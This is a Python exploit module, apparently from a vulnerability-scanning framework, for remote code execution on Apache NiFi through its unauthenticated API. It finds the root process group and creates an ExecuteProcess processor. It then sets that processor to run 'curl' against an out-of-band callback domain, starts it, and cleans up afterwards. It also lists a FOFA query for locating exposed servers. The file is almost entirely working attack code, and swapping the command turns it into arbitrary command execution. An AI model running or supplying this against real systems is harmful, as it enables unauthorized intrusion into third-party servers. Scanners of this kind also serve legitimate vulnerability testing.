import requests
import json
from plugins.oob import verify_request, gen_oob_domain



# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Apache NiFi RCE''',
        "description": '''Apache NiFi RCE''',
        "severity": "critical",
        "references": [
            "https://github.com/EdgeSecurityTeam/Vulnerability/blob/main/Apache%20NiFi%20Api%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C(RCE).md"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "https://hub.docker.com/layers/nifi/apache/nifi/1.12.1/images/sha256-bf7576ab7ad0bfe38c86be5baa47229d1644287984034dc9d5ff4801c5827115?context=explore",
            "fofa-query": '"nifi" && title=="NiFi"',
        },
        "tags": ["nifi", "rce"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        oob_domain,flag = gen_oob_domain()

        #get g_id
        target0=url+"/nifi-api/process-groups/root"
        req0=requests.get(url=target0,timeout=10,verify=False)
        g_id=req0.json()["id"]

        #get p_id
        target1=url+"/nifi-api/process-groups/"+g_id+"/processors"
        data1 = {
            'component': {
                'type': 'org.apache.nifi.processors.standard.ExecuteProcess'
            },
            'revision': {
                'version': 0
            }
        }
        headers1 = {
            "Content-Type": "application/json",
        }
        req1=requests.post(url=target1,data=json.dumps(data1),headers=headers1,verify=False)
        p_id=req1.json()["id"]

        #exec
        target2=url+"/nifi-api/processors/"+p_id
        cmd='curl http://{}'.format(oob_domain)
        cmd = cmd.split(" ")
        data2 = {
            'component': {
                'config': {
                    'autoTerminatedRelationships': ['success'],
                    'properties': {
                        'Command': cmd[0],
                        'Command Arguments': " ".join(cmd[1:]),
                    },
                    'schedulingPeriod': '3600 sec'
                },
                'id': p_id,
                'state': 'RUNNING'
            },
            'revision': {'clientId': 'x', 'version': 1}
        }
        headers2 = {
            "Content-Type": "application/json",
        }
        req2=requests.put(url=target2, data=json.dumps(data2), headers=headers2, verify=False,timeout=10)

        #delete
        target3=url+"/nifi-api/processors/" + p_id + "/run-status"
        data3 = {'revision': {'clientId': 'x', 'version': 1}, 'state': 'STOPPED'}
        requests.put(url=target3, data=json.dumps(data3), timeout=10,verify=False)
        requests.delete(target3 + "/threads", verify=False)

        if verify_request(type="dns", flag=flag):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+"/nifi-api/processors/"+p_id

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url